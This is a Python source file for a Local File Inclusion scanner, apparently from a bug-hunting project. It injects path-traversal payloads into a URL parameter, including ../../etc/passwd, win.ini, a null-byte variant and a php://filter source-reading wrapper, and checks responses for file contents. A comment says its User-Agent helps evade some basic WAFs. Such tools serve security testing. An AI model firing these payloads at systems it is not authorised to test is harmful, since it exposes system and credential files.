#!/usr/bin/env python3
"""
LFI-Scanner: A tool to identify Local File Inclusion vulnerabilities.
Part of the Bughunt project (OWASP A03: Injection).
"""

import requests
import argparse
import os
import sys

# Try to import project config
try:
    from config import PAYLOADS
except ImportError:
    PAYLOADS = {"lfi": None}

# Indicators of successful LFI (Linux and Windows)
LFI_INDICATORS = [
    "root:x:0:0:",              # Linux /etc/passwd
    "daemon:x:1:1:",            # Linux /etc/passwd
    "[boot loader]",            # Windows boot.ini
    "; for 16-bit app support", # Windows win.ini (common in newer Windows)
    "extensions",                # Often found in Windows ini files
    "nameserver",               # Linux /etc/resolv.conf
    "127.0.0.1",                # Linux /etc/hosts
]

def load_payloads(file_path, limit=150):
    """Loads LFI payloads from SecLists or uses a default fallback list."""
    if file_path and os.path.exists(file_path):
        payloads = []
        with open(file_path, "r", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    payloads.append(line)
                    if len(payloads) >= limit:
                        break
        return payloads
    
    # Fallback basic payloads if SecLists is missing
    print("[!] SecLists LFI wordlist not found. Using fallback payloads.")
    return [
        "/etc/passwd",
        "../../../../etc/passwd",
        "/etc/hosts",
        "../../../../etc/hosts",
        "C:\\Windows\\win.ini",
        "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
        "../../../../../../../../etc/passwd%00", # Null byte
        "php://filter/convert.base64-encode/resource=index.php" # PHP wrapper
    ]

def scan_lfi(url, wordlist_path=None):
    print(f"[*] Starting LFI scan on: {url}")
    
    if "FUZZ" not in url:
        print("[!] Error: No 'FUZZ' keyword found in URL. Example: http://target.com/page.php?file=FUZZ")
        return

    payloads = load_payloads(wordlist_path)
    print(f"[*] Testing {len(payloads)} payloads...")

    found_vulnerabilities = []

    for payload in payloads:
        target = url.replace("FUZZ", payload)
        try:
            # Using a custom User-Agent to avoid some basic WAFs
            headers = {'User-Agent': 'Mozilla/5.0 (Bughunt LFI-Scanner)'}
            response = requests.get(target, headers=headers, timeout=5, allow_redirects=True)
            
            for indicator in LFI_INDICATORS:
                if indicator in response.text:
                    print(f"\n{'-'*50}")
                    print(f"[!] LFI VULNERABILITY DETECTED!")
                    print(f"    Payload:  {payload}")
                    print(f"    Indicator: {indicator}")
                    print(f"    Target:    {target}")
                    print(f"{'-'*50}\n")
                    
                    found_vulnerabilities.append({
                        "payload": payload,
                        "url": target,
                        "indicator": indicator
                    })
                    # We continue to see if other payloads work (e.g., wrappers vs direct)
                    break 
                    
        except Exception as e:
            # Silent fail for individual requests to keep output clean
            pass

    if not found_vulnerabilities:
        print("[-] No LFI vulnerabilities detected with the current wordlist.")
    
    return found_vulnerabilities

def main():
    parser = argparse.ArgumentParser(description="LFI-Scanner (OWASP A03)")
    parser.add_argument("url", help="Target URL with FUZZ keyword (e.g. http://site.com/view?file=FUZZ)")
    parser.add_argument("--wordlist", help="Optional path to custom LFI wordlist")
    parser.add_argument("--full", action="store_true", help="Use full SecLists LFI wordlist")

    args = parser.parse_args()

    # Determine wordlist path
    w_path = args.wordlist if args.wordlist else (PAYLOADS.get("lfi") if args.full else None)
    
    scan_lfi(args.url, w_path)

if __name__ == "__main__":
    main()
